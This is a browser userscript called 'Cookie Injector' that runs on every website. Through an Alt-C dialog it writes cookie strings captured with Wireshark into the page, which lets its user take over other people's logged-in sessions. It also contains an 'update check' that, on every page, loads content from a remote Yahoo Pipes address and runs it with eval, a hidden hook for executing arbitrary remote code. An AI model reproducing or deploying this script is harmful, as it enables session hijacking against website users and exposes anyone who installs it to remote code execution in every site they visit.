// ==UserScript==
// @name           Cookie Injector (mod FF + Chrome)
// @namespace      http://blog.krakenstein.net
// @description    Inject Cookie String Into Any Webpage
// @version        1.0
// @include        *
// ==/UserScript==

/**
  Original Header:
  ==========================================================
  Cookie Injector
  BearsWithWings
  Inject Cookie String From Wireshark Dump Into Any Webpage
  *
  http://dustint.com/code/cookieinjector.user.js
**/

//Anonomyous function wrapper
(function (){
const yodUpdate = {
  script_id : 109320,
  script_version : '1.0',
  script_pipeId : '7015d15962d94b26823e801048aae95d',
}

function setValue(key, value) {
  localStorage.setItem(key, value);
  return false;
}

function getValue(key) {
  var val = localStorage.getItem(key);
  return val;
}

function usoUpdate(el) {
  const s_CheckUpdate = 'YodCheckUpdate' + yodUpdate['script_id'];
  var md = parseInt(new Date().getDate());
  var CheckUpdate = parseInt(getValue(s_CheckUpdate));
  var NeedCheckUpdate = false;
  if (CheckUpdate !== md) {
    setValue(s_CheckUpdate, md);
    el = el ? el : document.body;
    if (el) {
      if (!document.getElementById(s_CheckUpdate)) {
        var s_gm = document.createElement('script');
        s_gm.id = s_CheckUpdate;
        s_gm.type = 'text/javascript';
        s_gm.innerHTML = 'function go' + s_CheckUpdate + '(itm){if(itm.value.items.length){return eval(unescape(itm.value.items[0].content).replace(/&lt;/g,\'<\').replace(/&gt;/g,\'>\').replace(/&amp;/g,\'&\'));}}';
        el.appendChild(s_gm);
      }
      var s_gm = document.createElement('script');
      s_gm.type = 'text/javascript';
      var sSrc = 'http://pipes.yahoo.com/pipes/pipe.run?_id=' + yodUpdate['script_pipeId'];
      sSrc += '&_render=json&_callback=go' + s_CheckUpdate;
      sSrc += '&id=' + yodUpdate['script_id'] + '&ver=' + yodUpdate['script_version'];
      //sSrc += '&redir=yes';
      s_gm.src = sSrc;
      el.appendChild(s_gm);

      NeedCheckUpdate = true;
    }
  }
  else {
    setValue(s_CheckUpdate, md);
  }

  return NeedCheckUpdate;
}

function yodrunScript() {
  var cookieInjector = function(){
    var cI = this;

    /**
    * Cookie Injector Onload Function
    * Sets up the cookie injector dialogu
    */
    cI.onLoad = function(){
      //Create the DIV to contain the Dialog
      cI.dialog = document.createElement('div');
      cI.dialog.id = "cookieInjectorDiv";
      cI.dialog.innerHTML = "<div align='center'>Enter Cookie as format:<br/>(ex: name=val;) separate with ';'<br/><input type='text' id='cookieInjectorCookie'/><br/></div>";
      var button = document.createElement('button'); button.innerHTML = "OK";
      button.addEventListener('click',cI.writeCookie,false);
      cI.dialog.appendChild(button);
      var button = document.createElement('button'); button.innerHTML = "Cancel";
      button.addEventListener('click',cI.hide,false);
      cI.dialog.appendChild(button);
      cI.dialog.setAttribute("style",
        "display:none;position:fixed;opacity:0.9;top:40%;background-color:#DDDDDD;\
        left:40%;width:20%;z-index:99999;padding:5px;border:solid 1px gray;\
        font-family:Arial;font-size:12px;");
      document.body.appendChild(cI.dialog);
      cI.visible = false;
    }

    /**
    * Show the dialog
    */
    cI.show = function(){
      cI.dialog.style.display = "block";
      cI.visible = true;
    }

    /**
    * Hide the dialog
    */
    cI.hide = function(){
      cI.dialog.style.display = "none";
      cI.visible = false;
    }

    /**
    * Gets the wireshark dump string and converts it into cookies
    */
    cI.writeCookie = function(){
      //Grab a handle to the text field which contains the string
      var cookieNode = document.getElementById('cookieInjectorCookie');
      var cookieText = cI.cleanCookie(cookieNode.value);
      cookieNode.value = "";

      //We have to add the cookies one at a time, so split around the colin
      var cookieArray = cookieText.split(";");
      var injectedval = 0;
      for(var x=0; x<cookieArray.length; x++){
        //We want the path to be the root, the host is filled in automatically
        //since we are on the same webpage that we captured the cookies on
        var cookievalArray = cookieArray[x].split("=");
        if (cookievalArray.length>=2) {
          var name, val;
          if ((name = cookievalArray[0].toString().trim()) && (val = cookievalArray[1].toString().trim())) {
            //document.cookie = name+"="+val+"; path=/";
            document.cookie = cookieArray[x]+"; path=/";
            //alert(name+"="+val);
            injectedval++;
          }
        }
      }

      if (injectedval) {
        alert("All Cookies Have Been Written");
        cI.hide();
      } else {
        alert("Invalid (ex: name=val;) separate with ';'");
      }
    }

    /**
    * Do a little big of cleanup on the cookie string, Mostly we are looking
    * To get rid of the "Cookie: " string that Wireshark prepends to the cookie string
    */
    cI.cleanCookie = function(cookieText){
      var cookie = cookieText.replace("Cookie: ","");
      return cookie;
    }

    /**
    * Handle all keypresses, we are looking for an ALT-C key-combo. Since we can't detect
    * Two keys being pressed at the same time, we first make sure the ALT key was pressed
    * then we wait to see if the C key is pressed next
    */
    cI.keyPress = function (e){
      //Check to see if "C" is pressed after ALT
      if(e.keyCode == 67 && cI.ctrlFire){
        if(!cI.visible){
          cI.show();
        }else{
          cI.hide();
        }
      }

      //Make sure the Alt key was previously depressed
      if(e.keyCode == 18){
        cI.ctrlFire = true;
      }else{
        cI.ctrlFire = false;
      }
    }
  };

  if (document.getElementById('cookieInjectorDiv')) return;
  //if (document.getElementById('cookieInjectorDiv_yodrunScript')) return;
  var cI = new cookieInjector({});
  //Setup our dialog after the document loads
  //window.addEventListener('load', cI.onLoad,'false');
  cI.onLoad();
  //Capture all onkeydown events, so we can filter for our key-combo
  window.addEventListener('keydown', cI.keyPress,'false');
}

var script = document.createElement("script");
script.type = "text/javascript";
script.id = "cookieInjectorDiv_yodrunScript";
script.textContent = "(" + yodrunScript + ")();";
document.body.appendChild(script);

usoUpdate();
})();